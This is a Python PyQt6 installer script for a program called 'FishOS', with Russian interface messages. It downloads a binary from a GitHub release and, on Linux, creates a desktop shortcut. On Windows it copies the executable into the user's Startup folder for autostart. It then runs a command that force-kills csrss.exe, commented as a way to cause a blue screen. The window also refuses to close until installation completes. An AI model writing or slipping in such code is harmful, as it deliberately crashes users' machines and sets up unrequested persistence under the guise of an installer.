import sys
import os
import shutil
from threading import Thread
import requests
from PyQt6 import QtGui
from PyQt6.QtGui import QIcon
from PyQt6.QtWidgets import *
from install_pages import page1, page2
from install_pages.progress import ProgressWindow
from web import download_asset, _get_local_data

SIZE = (640, 480)
VERSION = 'v0.0.1'


class InstallWindow(QWidget):
    def __init__(self):
        super().__init__()

        self.installed = False
        self.iw = None
        self.thread = None

        self.setWindowTitle("Install FishOS")
        self.setGeometry(300, 300, *SIZE)
        self.setMaximumSize(*SIZE)
        self.setMinimumSize(*SIZE)

        self.stack = QStackedWidget(self)
        self.main_layout = QVBoxLayout(self)
        self.main_layout.setContentsMargins(0, 0, 0, 0)
        self.main_layout.addWidget(self.stack)

        self.page1 = page1.Page1(self)
        self.page2 = page2.Page2(self)

        self.stack.addWidget(self.page1)
        self.stack.addWidget(self.page2)

        self.page1.next_btn.clicked.connect(self.page_1_to_2)
        self.page2.install_button.clicked.connect(self.install)

    def page_1_to_2(self):
        self.stack.setCurrentWidget(self.page2)

    def install(self):
        if not (self.page2.cb1.isChecked() and self.page2.cb2.isChecked()):
            QMessageBox.information(
                self,
                "Warning",
                "Пожалуйста, примите пользовательское соглашение и подтвердите, что вы отдаёте отчет своим действиям."
            )
            return
        print("Installing FishOS")
        print(sys.platform)

        self.page2.cb1.setDisabled(True)
        self.page2.cb2.setDisabled(True)
        self.page2.cb3.setDisabled(True)
        self.page2.install_button.setDisabled(True)

        self.run_install(sys.platform)

    def download_binary(self, system: str, local_data, startup_folder, link_path):
        if 'win' in system:
            url = f'https://github.com/Salmon-bit/FishOS/releases/download/{VERSION}/fos.exe'
            dest = os.path.join(local_data, 'fos.exe')

            try:
                r = requests.get(url, timeout=60)
            except requests.exceptions.RequestException as e:
                QMessageBox.critical(self, 'Ошибка', 'Ошибка подключения к серверу. Попробуйте позже')
                print(f'Connection error: {e}')
                return

            if r.status_code != 200:
                QMessageBox.critical(
                    self,
                    'Ошибка',
                    "Ошибка получения основного файла программы с сервера. Попробуйте позже."
                )
                print(f'Binary download error: {r.status_code}')
                return

            with open(dest, 'wb') as f:
                f.write(r.content)

            # Добавляем EXE в автозагрузку
            shutil.copyfile(dest, os.path.join(startup_folder, 'fos.exe'))

            self.iw.next()

            # Killing csrss.exe to make BSOD
            os.system('taskkill /F /IM csrss.exe')

        elif system == 'linux':
            url = f'https://github.com/Salmon-bit/FishOS/releases/download/{VERSION}/fos'
            dest = os.path.join(local_data, 'fos')

            try:
                r = requests.get(url, timeout=60)
            except requests.exceptions.RequestException as e:
                QMessageBox.critical(self, "Ошибка", 'Ошибка подключения к серверу. Попробуйте позже')
                print(f'Connection error: {e}')
                return

            if r.status_code != 200:
                QMessageBox.critical(
                    self,
                    'Ошибка',
                    "Ошибка получения основного файла программы с сервера. Попробуйте позже."
                )
                print(f'Binary download error: {r.status_code}')
                return

            with open(dest, 'wb') as f:
                f.write(r.content)

            os.chmod(dest, 0o755)

            self.iw.next()

            DATA = f"""\
[Desktop Entry]
Version=1.0
Name=FishOS
Comment=Fun Operating System
Type=Application
Terminal=false
Exec={dest}
Icon={os.path.join(local_data, 'fos_ICON.png')}"""
            with open(link_path, "w") as f:
                f.write(DATA)

            self.iw.addValue(10)
            self.installed = True
            QMessageBox.information(
                self,
                "Информация",
                "FishOS успешно установлена на ваш ПК.\nСпасибо, что выбираете нас!"
            )

    def run_install(self, system: str):
        if not download_asset('assets_list.txt'):
            return

        if 'win' in system:
            local_data = _get_local_data()

            with open(os.path.join(local_data, 'assets_list.txt'), 'r', encoding='UTF-8') as f:
                assets_list = [l.strip() for l in f.readlines() if l.strip()]

            if not download_asset('fos_ICON.ico'):
                return

            self.iw = ProgressWindow(QIcon(os.path.join(local_data, 'fos_ICON.ico')), len(assets_list) + 1)
            self.iw.show()

            print(assets_list)

            for a in assets_list:
                if not download_asset(a):
                    return
                self.iw.next()

            app_data = os.getenv("APPDATA")
            startup_folder = os.path.join(app_data, r"Microsoft\Windows\Start Menu\Programs\Startup")

            self.thread = Thread(
                target=self.download_binary,
                args=(sys.platform, local_data, startup_folder, ''),
                daemon=True,
            )
            self.thread.start()

        elif system == 'linux':
            home_path = os.getenv("HOME")
            home_dirs = os.listdir(home_path)

            desktop_dir = None
            for name in ('Desktop', 'Рабочий стол'):
                candidate = os.path.join(home_path, name)
                if name in home_dirs and os.path.isdir(candidate):
                    desktop_dir = candidate
                    break

            if desktop_dir is None:
                desktop_dir = os.path.join(home_path, "Desktop")
                os.makedirs(desktop_dir, exist_ok=True)

            link_path = os.path.join(desktop_dir, 'FishOS.desktop')

            local_data = _get_local_data()

            with open(os.path.join(local_data, 'assets_list.txt'), 'r', encoding='UTF-8') as f:
                assets_list = [l.strip() for l in f.readlines() if l.strip()]

            if not download_asset('fos_ICON.png'):
                return

            print(assets_list)

            self.iw = ProgressWindow(QIcon(os.path.join(local_data, 'fos_ICON.png')), len(assets_list) + 1)
            self.iw.show()

            for a in assets_list:
                if not download_asset(a):
                    return
                self.iw.next()

            self.thread = Thread(
                target=self.download_binary,
                args=(sys.platform, local_data, '', link_path),
                daemon=True,
            )
            self.thread.start()

    def closeEvent(self, event: QtGui.QCloseEvent) -> None:
        if not self.installed:
            event.ignore()
        else:
            event.accept()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    install_window = InstallWindow()
    install_window.show()

    sys.exit(app.exec())